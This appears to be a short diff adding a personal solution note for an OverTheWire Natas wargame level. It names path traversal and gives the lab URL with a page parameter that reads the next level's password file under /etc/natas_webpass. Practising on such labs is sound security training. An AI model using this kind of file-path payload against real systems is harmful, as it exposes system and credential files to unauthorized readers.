@@ -1,0 +1,4 @@
+key :
+path traversal
+1. http://natas7.natas.labs.overthewire.org/index.php
+2. ?page=/etc/natas_webpass/natas8
